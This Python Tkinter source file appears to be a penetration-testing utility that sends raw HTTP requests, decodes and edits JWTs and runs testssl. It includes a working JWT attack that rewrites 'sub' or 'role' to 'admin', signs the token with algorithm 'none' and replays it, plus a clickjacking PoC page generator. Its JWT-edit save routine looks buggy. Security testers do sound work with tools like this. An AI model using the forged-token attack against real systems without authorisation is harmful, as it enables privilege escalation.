import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import jwt
import json
import requests
import re
import subprocess
import os
from urllib.parse import urlparse, parse_qs
import base64

class HTTPRequestTool:
    def __init__(self, root):
        self.root = root
        self.root.title("HTTP Request Tool with JWT Decoder")
        
        # Set minimum window size
        self.root.minsize(1200, 800)
        
        # Create main paned window
        self.paned = ttk.PanedWindow(root, orient=tk.HORIZONTAL)
        self.paned.pack(fill=tk.BOTH, expand=True)
        
        # Left frame for request
        self.request_frame = ttk.Frame(self.paned)
        self.paned.add(self.request_frame, weight=1)
        
        # Right frame for JWT and response
        self.response_frame = ttk.Frame(self.paned)
        self.paned.add(self.response_frame, weight=1)
        
        # Create vertical paned window for JWT and response
        self.vertical_paned = ttk.PanedWindow(self.response_frame, orient=tk.VERTICAL)
        self.vertical_paned.pack(fill=tk.BOTH, expand=True)
        
        # JWT section
        self.jwt_section = ttk.Frame(self.vertical_paned)
        self.vertical_paned.add(self.jwt_section, weight=1)
        
        # JWT header with minimize checkbox
        jwt_header = ttk.Frame(self.jwt_section)
        jwt_header.pack(fill=tk.X, pady=5)
        self.minimize_jwt = tk.BooleanVar(value=False)
        self.minimize_check = ttk.Checkbutton(jwt_header, text="Minimize", variable=self.minimize_jwt, command=self.toggle_jwt_section)
        self.minimize_check.pack(side=tk.RIGHT, padx=5)
        
        # Add edit button next to JWT section
        edit_frame = ttk.Frame(self.jwt_section)
        edit_frame.pack(fill=tk.X, pady=5)
        ttk.Label(edit_frame, text="JWT Decoded").pack(side=tk.LEFT, pady=5)
        self.edit_button = ttk.Button(edit_frame, text="Edit JWT", command=self.edit_jwt)
        self.edit_button.pack(side=tk.RIGHT, padx=5)
        
        self.jwt_text = tk.Text(self.jwt_section, width=80, height=20)
        self.jwt_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        # Response section
        self.response_section = ttk.Frame(self.vertical_paned)
        self.vertical_paned.add(self.response_section, weight=1)
        
        # Response header
        response_header = ttk.Frame(self.response_section)
        response_header.pack(fill=tk.X, pady=5)
        ttk.Label(response_header, text="Response").pack(side=tk.LEFT, pady=5)
        copy_button = ttk.Button(response_header, text="📋 Copy", command=self.copy_response)
        copy_button.pack(side=tk.RIGHT, padx=5)
        
        self.response_text = tk.Text(self.response_section, width=80, height=20)
        self.response_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        # Request components
        ttk.Label(self.request_frame, text="HTTP Request").pack(pady=5)
        self.request_text = tk.Text(self.request_frame, width=80, height=40)
        self.request_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        # Bind text changes to JWT detection
        self.request_text.bind('<<Modified>>', self.on_text_change)
        
        # Button frame
        button_frame = ttk.Frame(self.request_frame)
        button_frame.pack(pady=5, fill=tk.X)
        
        # Send button
        self.send_button = ttk.Button(button_frame, text="Send Request", command=self.process_request)
        self.send_button.pack(side=tk.LEFT, padx=5)
        
        # JWT Attacks button
        self.jwt_attacks_button = ttk.Button(button_frame, text="JWT Attacks", command=self.show_jwt_attacks_menu)
        self.jwt_attacks_button.pack(side=tk.LEFT, padx=5)
        
        # Clickjack button
        self.clickjack_button = ttk.Button(button_frame, text="Generate Clickjack", command=self.generate_clickjack)
        self.clickjack_button.pack(side=tk.LEFT, padx=5)
        
        # TestSSL button
        self.testssl_button = ttk.Button(button_frame, text="Run TestSSL", command=self.run_testssl)
        self.testssl_button.pack(side=tk.LEFT, padx=5)

    def is_jwt(self, token):
        # Split the token into parts
        parts = token.split('.')
        
        # We only care about header and body
        if len(parts) < 2:
            return False
            
        try:
            # Check if header and body are valid base64
            for part in parts[:2]:  # Only check header and body
                if part:  # Skip empty parts
                    # Add padding if needed
                    padding = 4 - (len(part) % 4)
                    if padding != 4:
                        part += '=' * padding
                    decoded = base64.b64decode(part)
                    # Try to parse as JSON to verify structure
                    json.loads(decoded)
            return True
        except:
            return False

    def decode_jwt(self, token):
        try:
            # Split the token into parts
            parts = token.split('.')
            
            # We only care about header and body
            if len(parts) < 2:
                return "Invalid JWT format"
            
            # Decode header and body
            decoded_parts = []
            for part in parts[:2]:  # Only process header and body
                if part:
                    # Add padding if needed
                    padding = 4 - (len(part) % 4)
                    if padding != 4:
                        part += '=' * padding
                    decoded = base64.b64decode(part)
                    try:
                        # Try to parse as JSON
                        decoded_parts.append(json.loads(decoded))
                    except:
                        # If not JSON, just use the decoded string
                        decoded_parts.append(decoded.decode('utf-8'))
            
            # Format the output
            output = []
            if len(decoded_parts) >= 1:
                output.append(f"Header:\n{json.dumps(decoded_parts[0], indent=2)}")
            if len(decoded_parts) >= 2:
                output.append(f"\nPayload:\n{json.dumps(decoded_parts[1], indent=2)}")
                
            return '\n'.join(output)
        except Exception as e:
            return f"Error decoding JWT: {str(e)}"

    def encode_jwt(self, header, payload, signature=None):
        try:
            # Encode header and payload
            encoded_header = base64.urlsafe_b64encode(
                json.dumps(header).encode('utf-8')
            ).decode('utf-8').rstrip('=')
            
            encoded_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode('utf-8')
            ).decode('utf-8').rstrip('=')
            
            # Construct the token
            token_parts = [encoded_header, encoded_payload]
            if signature:
                token_parts.append(signature)
            
            return '.'.join(token_parts)
        except Exception as e:
            return f"Error encoding JWT: {str(e)}"

    def find_jwt(self, request_text):
        # Split request into words and check each for JWT pattern
        tokens = []
        seen_tokens = set()  # Track seen tokens to avoid duplicates
        
        # Find all potential JWT patterns in the text
        # This regex looks for base64 strings separated by dots
        jwt_pattern = r'[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+(?:\.[A-Za-z0-9-_=]+)?'
        potential_tokens = re.findall(jwt_pattern, request_text)
        
        for token in potential_tokens:
            # Clean up the token
            token = token.strip()
            token = re.sub(r'^[\'\"]+|[\'\"]+$', '', token)
            
            # Only process if we haven't seen this token before
            if token not in seen_tokens and self.is_jwt(token):
                tokens.append(token)
                seen_tokens.add(token)
        
        # Return all found JWTs
        return tokens

    def on_text_change(self, event=None):
        # Reset the modified flag
        self.request_text.edit_modified(False)
        
        # Get current text and find/decode JWTs
        request_text = self.request_text.get("1.0", tk.END).strip()
        jwt_tokens = self.find_jwt(request_text)
        
        self.jwt_text.delete("1.0", tk.END)
        if jwt_tokens:
            decoded_output = ""
            for i, token in enumerate(jwt_tokens, 1):
                decoded_output += f"JWT #{i}:\n{self.decode_jwt(token)}\n\n"
            self.jwt_text.insert("1.0", decoded_output)
        else:
            self.jwt_text.insert("1.0", "No JWT tokens found in request")

    def copy_response(self):
        response_text = self.response_text.get("1.0", tk.END).strip()
        self.root.clipboard_clear()
        self.root.clipboard_append(response_text)
        messagebox.showinfo("Success", "Content copied to clipboard!")

    def generate_clickjack(self):
        url = simpledialog.askstring("Generate Clickjack", "Enter target URL:")
        if url:
            clickjack_html = f"""<html>
   <head>
      <title>Aon Clickjacking Example PoC</title>
      <style>
         body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
         }}
         .container {{
            max-width: 1200px;
            margin: 0 auto;
         }}
         h1 {{
            color: #333;
            margin-bottom: 20px;
         }}
         .iframe-container {{
            position: relative;
            width: 100%;
            height: 80vh;
         }}
         iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.5;
            border: 2px solid #333;
         }}
      </style>
   </head>
   <body>
      <div class="container">
         <h1>Aon Clickjacking PoC</h1>
         <div class="iframe-container">
            <iframe src="{url}"></iframe>
         </div>
      </div>
   </body>
</html>"""
            self.response_text.delete("1.0", tk.END)
            self.response_text.insert("1.0", clickjack_html)

    def process_request(self):
        request_text = self.request_text.get("1.0", tk.END).strip()
        
        try:
            # Parse the raw HTTP request
            request_lines = request_text.split('\n')
            if not request_lines:
                raise ValueError("Empty request")

            # Parse first line (method, path, version)
            method, path, *_ = request_lines[0].split()
            
            # Parse headers
            headers = {}
            current_line = 1
            while current_line < len(request_lines) and request_lines[current_line].strip():
                header_line = request_lines[current_line].strip()
                key, value = header_line.split(':', 1)
                headers[key.strip()] = value.strip()
                current_line += 1
            
            # Get body if exists (after blank line)
            body = None
            if current_line < len(request_lines):
                body = '\n'.join(request_lines[current_line + 1:]).strip()
            
            # Parse URL
            if not path.startswith('http'):
                # If host header exists, use it to construct full URL
                host = headers.get('Host', '')
                if host:
                    scheme = 'https' if 'https' in host.lower() else 'http'
                    path = f"{scheme}://{host}{path}"
                else:
                    raise ValueError("No host specified in headers and path is not absolute URL")
            
            # Send the request
            response = requests.request(
                method=method,
                url=path,
                headers=headers,
                data=body,
                verify=False  # Skip SSL verification for testing
            )
            
            # Format response
            response_text = f"HTTP/{response.raw.version / 10.0} {response.status_code} {response.reason}\n"
            for key, value in response.headers.items():
                response_text += f"{key}: {value}\n"
            response_text += f"\n{response.text}"
            
            self.response_text.delete("1.0", tk.END)
            self.response_text.insert("1.0", response_text)
            
        except Exception as e:
            self.response_text.delete("1.0", tk.END)
            self.response_text.insert("1.0", f"Error processing request: {str(e)}")

    def run_testssl(self):
        domain = simpledialog.askstring("TestSSL", "Enter domain to test:")
        if domain:
            try:
                # Store current directory
                current_dir = os.getcwd()
                
                # Change to testssl directory
                os.chdir('testssl')
                
                # Make sure testssl.sh is executable
                os.chmod('testssl.sh', 0o755)
                
                # Run testssl.sh with HTML output using system OpenSSL
                result = subprocess.run(
                    ['./testssl.sh', '--html', domain],
                    capture_output=True,
                    text=True
                )
                
                # Change back to original directory
                os.chdir(current_dir)
                
                # Display the output in the response text area
                self.response_text.delete("1.0", tk.END)
                self.response_text.insert("1.0", f"TestSSL Results for {domain}:\n\n{result.stdout}")
                
                if result.stderr:
                    self.response_text.insert(tk.END, f"\n\nErrors:\n{result.stderr}")
                
                messagebox.showinfo("TestSSL", f"TestSSL scan completed for {domain}")
            except Exception as e:
                # Make sure we change back to original directory even if there's an error
                os.chdir(current_dir)
                messagebox.showerror("Error", f"Failed to run TestSSL: {str(e)}")

    def toggle_jwt_section(self):
        if self.minimize_jwt.get():
            self.jwt_text.pack_forget()
        else:
            self.jwt_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)

    def show_jwt_attacks_menu(self):
        # Create a new window for JWT attacks
        attack_window = tk.Toplevel(self.root)
        attack_window.title("JWT Attacks")
        attack_window.geometry("400x300")
        
        # Create a frame for attack options
        attack_frame = ttk.Frame(attack_window)
        attack_frame.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
        
        # Add attack options
        self.unverified_sig_var = tk.BooleanVar()
        ttk.Checkbutton(attack_frame, text="Unverified Signature Attack", variable=self.unverified_sig_var).pack(anchor=tk.W, pady=5)
        
        # Add run button
        ttk.Button(attack_frame, text="Run Selected Attacks", command=lambda: self.run_jwt_attacks(attack_window)).pack(pady=10)

    def run_jwt_attacks(self, attack_window):
        if self.unverified_sig_var.get():
            self.perform_unverified_signature_attack()
        attack_window.destroy()

    def perform_unverified_signature_attack(self):
        # Get the current request text
        request_text = self.request_text.get("1.0", tk.END).strip()
        
        # Find JWT tokens in the request
        jwt_tokens = self.find_jwt(request_text)
        if not jwt_tokens:
            messagebox.showerror("Error", "No JWT tokens found in request")
            return
        
        # Get the first JWT token
        original_token = jwt_tokens[0]
        
        try:
            # Decode the JWT without verification
            header = jwt.get_unverified_header(original_token)
            payload = jwt.decode(original_token, options={"verify_signature": False})
            
            # Modify a value in the payload (e.g., change 'sub' to 'admin' if it exists)
            if 'sub' in payload:
                payload['sub'] = 'admin'
            elif 'role' in payload:
                payload['role'] = 'admin'
            else:
                # If no obvious fields to modify, add a new one
                payload['modified'] = 'true'
            
            # Create a new token with the modified payload
            # We don't need to sign it since we're testing unverified signature
            modified_token = jwt.encode(payload, "", algorithm="none")
            
            # Replace the original token in the request
            modified_request = request_text.replace(original_token, modified_token)
            
            # Send the modified request
            self.request_text.delete("1.0", tk.END)
            self.request_text.insert("1.0", modified_request)
            self.process_request()
            
            # Get the response status code from the response text
            response_text = self.response_text.get("1.0", tk.END)
            status_line = response_text.split('\n')[0]
            try:
                status_code = int(status_line.split()[1])
            except (IndexError, ValueError):
                status_code = 0
            
            # Check if the status code indicates failure (400 or 500 series)
            if status_code >= 400:
                messagebox.showinfo("Attack Result", "Unverified Signature Attack: ❌ FAILED")
            else:
                messagebox.showinfo("Attack Result", "Unverified Signature Attack: ✅ SUCCESS")
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to perform attack: {str(e)}")

    def edit_jwt(self):
        # Get the current JWT content
        jwt_content = self.jwt_text.get("1.0", tk.END).strip()
        if not jwt_content or "No JWT tokens found" in jwt_content:
            messagebox.showinfo("Info", "No JWT to edit")
            return
            
        # Create edit window
        edit_window = tk.Toplevel(self.root)
        edit_window.title("Edit JWT")
        edit_window.geometry("600x400")
        
        # Create text widgets for header and payload
        header_frame = ttk.LabelFrame(edit_window, text="Header")
        header_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        header_text = tk.Text(header_frame, width=80, height=10)
        header_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        payload_frame = ttk.LabelFrame(edit_window, text="Payload")
        payload_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        payload_text = tk.Text(payload_frame, width=80, height=10)
        payload_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Parse current JWT content
        try:
            header_start = jwt_content.find("Header:") + 7
            header_end = jwt_content.find("Payload:")
            payload_start = header_end + 8
            
            header_json = json.loads(jwt_content[header_start:header_end].strip())
            payload_json = json.loads(jwt_content[payload_start:].strip())
            
            # Populate text widgets
            header_text.insert("1.0", json.dumps(header_json, indent=2))
            payload_text.insert("1.0", json.dumps(payload_json, indent=2))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to parse JWT: {str(e)}")
            return
        
        # Add save button
        def save_changes():
            try:
                # Get edited content
                new_header = json.loads(header_text.get("1.0", tk.END).strip())
                new_payload = json.loads(payload_text.get("1.0", tk.END).strip())
                
                # Re-encode the JWT
                new_token = self.encode_jwt(new_header, new_payload)
                
                # Update the request text with the new token
                current_request = self.request_text.get("1.0", tk.END)
                # Find and replace the old token with the new one
                # This is a simple replacement - you should make it more robust
                updated_request = current_request.replace(jwt_content.split('\n')[0].split(':')[1].strip(), new_token)
                self.request_text.delete("1.0", tk.END)
                self.request_text.insert("1.0", updated_request)
                
                edit_window.destroy()
                # Trigger text change to update decoded view
                self.on_text_change()
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save changes: {str(e)}")
        
        save_button = ttk.Button(edit_window, text="Save Changes", command=save_changes)
        save_button.pack(pady=10)

def main():
    root = tk.Tk()
    app = HTTPRequestTool(root)
    root.mainloop()

if __name__ == "__main__":
    main()
